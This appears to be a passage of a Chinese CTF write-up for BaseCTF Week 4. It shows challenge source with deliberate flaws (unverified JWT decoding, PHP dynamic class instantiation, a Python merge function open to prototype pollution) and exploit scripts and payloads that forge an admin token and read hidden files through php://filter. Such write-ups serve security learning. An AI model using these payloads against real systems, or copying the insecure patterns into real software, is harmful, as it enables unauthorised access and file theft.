class=s2>&#34;28dd2c7955ce926456240b2ff0100bde&#34;</span><span class=p>,</span><span class=s2>&#34;d2ddea18f00665ce8623e36bd4e3c7c5&#34;</span><span class=p>,</span><span class=s2>&#34;1f0e3dad99908345f7439f8ffabdffc4&#34;</span><span class=p>,</span><span class=s2>&#34;43ec517d68b6edd3015b3edc9a11367b&#34;</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>index</span><span class=p>,</span> <span class=n>char</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>hashes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>flag_char</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>256</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>flag_char</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;UTF-8&#34;</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>())</span> <span class=o>==</span> <span class=n>char</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>((</span><span class=n>flag_char</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><p>然后再异或一下就可以了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 加密后的ASCII数组</span>
</span></span><span class=line><span class=cl><span class=n>encrypted_data</span> <span class=o>=</span> <span class=p>[</span><span class=mi>66</span><span class=p>,</span> <span class=mi>96</span><span class=p>,</span> <span class=mi>113</span><span class=p>,</span> <span class=mi>102</span><span class=p>,</span> <span class=mi>71</span><span class=p>,</span> <span class=mi>81</span><span class=p>,</span> <span class=mi>64</span><span class=p>,</span> <span class=mi>124</span><span class=p>,</span> <span class=mi>49</span><span class=p>,</span> <span class=mi>58</span><span class=p>,</span> <span class=mi>50</span><span class=p>,</span> <span class=mi>61</span><span class=p>,</span> <span class=mi>106</span><span class=p>,</span> <span class=mi>105</span><span class=p>,</span> <span class=mi>60</span><span class=p>,</span> <span class=mi>107</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                  <span class=mi>61</span><span class=p>,</span> <span class=mi>39</span><span class=p>,</span> <span class=mi>36</span><span class=p>,</span> <span class=mi>42</span><span class=p>,</span> <span class=mi>39</span><span class=p>,</span> <span class=mi>56</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=mi>46</span><span class=p>,</span> <span class=mi>46</span><span class=p>,</span> <span class=mi>47</span><span class=p>,</span> <span class=mi>55</span><span class=p>,</span> <span class=mi>121</span><span class=p>,</span> <span class=mi>46</span><span class=p>,</span> <span class=mi>41</span><span class=p>,</span> <span class=mi>38</span><span class=p>,</span> <span class=mi>50</span><span class=p>,</span> <span class=mi>19</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                  <span class=mi>21</span><span class=p>,</span> <span class=mi>64</span><span class=p>,</span> <span class=mi>20</span><span class=p>,</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>21</span><span class=p>,</span> <span class=mi>69</span><span class=p>,</span> <span class=mi>69</span><span class=p>,</span> <span class=mi>24</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>73</span><span class=p>,</span> <span class=mi>19</span><span class=p>,</span> <span class=mi>81</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 解密后的字符串</span>
</span></span><span class=line><span class=cl><span class=n>decrypted_string</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>chr</span><span class=p>(</span><span class=n>value</span> <span class=o>^</span> <span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>value</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 输出结果</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>decrypted_string</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=week4-no-jwt>[Week4] No JWT</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>jsonify</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>jwt</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>datetime</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 随机生成 secret_key</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>secret_key</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choices</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=p>,</span> <span class=n>k</span><span class=o>=</span><span class=mi>16</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 登录接口</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>json</span>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;password&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 其他用户都给予 user 权限</span>
</span></span><span class=line><span class=cl>    <span class=n>token</span> <span class=o>=</span> <span class=n>jwt</span><span class=o>.</span><span class=n>encode</span><span class=p>({</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;sub&#39;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;role&#39;</span><span class=p>:</span> <span class=s1>&#39;user&#39;</span><span class=p>,</span>  <span class=c1># 普通用户角色</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;exp&#39;</span><span class=p>:</span> <span class=n>datetime</span><span class=o>.</span><span class=n>datetime</span><span class=o>.</span><span class=n>utcnow</span><span class=p>()</span> <span class=o>+</span> <span class=n>datetime</span><span class=o>.</span><span class=n>timedelta</span><span class=p>(</span><span class=n>hours</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=n>app</span><span class=o>.</span><span class=n>secret_key</span><span class=p>,</span> <span class=n>algorithm</span><span class=o>=</span><span class=s1>&#39;HS256&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;token&#39;</span><span class=p>:</span> <span class=n>token</span><span class=p>}),</span> <span class=mi>200</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># flag 接口</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>flag</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>token</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;Authorization&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>token</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>decoded</span> <span class=o>=</span> <span class=n>jwt</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>token</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34; &#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>],</span> <span class=n>options</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;verify_signature&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span> <span class=s2>&#34;verify_exp&#34;</span><span class=p>:</span> <span class=kc>False</span><span class=p>})</span>
</span></span><span class=line><span class=cl>            <span class=c1># 检查用户角色是否为 admin</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>decoded</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;role&#39;</span><span class=p>)</span> <span class=o>==</span> <span class=s1>&#39;admin&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>flag_content</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;flag&#39;</span><span class=p>:</span> <span class=n>flag_content</span><span class=p>}),</span> <span class=mi>200</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;message&#39;</span><span class=p>:</span> <span class=s1>&#39;Access denied: admin only&#39;</span><span class=p>}),</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>FileNotFoundError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;message&#39;</span><span class=p>:</span> <span class=s1>&#39;Flag file not found&#39;</span><span class=p>}),</span> <span class=mi>404</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>jwt</span><span class=o>.</span><span class=n>ExpiredSignatureError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;message&#39;</span><span class=p>:</span> <span class=s1>&#39;Token has expired&#39;</span><span class=p>}),</span> <span class=mi>401</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>jwt</span><span class=o>.</span><span class=n>InvalidTokenError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;message&#39;</span><span class=p>:</span> <span class=s1>&#39;Invalid token&#39;</span><span class=p>}),</span> <span class=mi>401</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;message&#39;</span><span class=p>:</span> <span class=s1>&#39;Token is missing&#39;</span><span class=p>}),</span> <span class=mi>401</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>搞到源码之后看看,发现是可以直接伪造的，但是有个时间我们得先搞到，所以得先登录一下才可以(手动尝试了很久都不行)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://challenge.basectf.fun:27799/login&#34;</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;username&#39;</span><span class=p>:</span> <span class=s1>&#39;bao&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;password&#39;</span><span class=p>:</span> <span class=s1>&#39;123&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 使用 json 参数发送 JSON 数据</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 确保响应包含 JSON 数据</span>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>json_response</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>token</span> <span class=o>=</span> <span class=n>json_response</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;token&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Response does not contain valid JSON&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>得到<code>jwt</code>之后直接伪造成<code>admin</code>即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://challenge.basectf.fun:27799/flag&#34;</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Authorization&#39;</span><span class=p>:</span> <span class=s1>&#39;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJiYW8iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MjY1MTUzNDh9.k5yO3yf2WuJag1hAYj4fy5w74-UxDfdeeEQeoH23kyo&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=week4-flag直接读取不就行了>[Week4] flag直接读取不就行了？</h2><p>原生类的利用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=s1>&#39;index.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$J1ng</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;J&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$Hong</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;H&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$Keng</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;K&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$Wang</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;W&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$dir</span> <span class=o>=</span> <span class=k>new</span> <span class=nv>$Keng</span><span class=p>(</span><span class=nv>$Wang</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>foreach</span><span class=p>(</span><span class=nv>$dir</span> <span class=k>as</span> <span class=nv>$f</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span><span class=p>(</span><span class=nv>$f</span> <span class=o>.</span> <span class=s1>&#39;&lt;br&gt;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=k>new</span> <span class=nv>$J1ng</span><span class=p>(</span><span class=nv>$Hong</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?K=FilesystemIterator&amp;W=/secret
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?K=SplFileObject&amp;W=php://filter/convert.base64-encode/resource=/secret/f11444g.php
</span></span></code></pre></td></tr></table></div></div><h2 id=week4-圣钥之战10>[Week4] 圣钥之战1.0</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span><span class=n>request</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>merge</span><span class=p>(</span><span class=n>src</span><span class=p>,</span> <span class=n>dst</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span><span class=p>,</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>src</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>hasattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=s1>&#39;__getitem__&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>k</span><span class=p>)</span> <span class=ow>and</span> <span class=nb>type</span><span class=p>(</span><span class=n>v</span><span class=p>)</span> <span class=o>==</span> <span class=nb>dict</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>merge</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>dst</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>k</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>dst</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=o>=</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=nb>hasattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>k</span><span class=p>)</span> <span class=ow>and</span> <span class=nb>type</span><span class=p>(</span><span class=n>v</span><span class=p>)</span> <span class=o>==</span> <span class=nb>dict</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>merge</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=nb>getattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>k</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>setattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>k</span><span class=p>,</span> <span class=n>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>is_json</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>cls</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>instance</span> <span class=o>=</span> <span class=bp>cls</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hello_world</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;/static/index.html&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/read&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>Read</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>file</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=vm>__file__</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
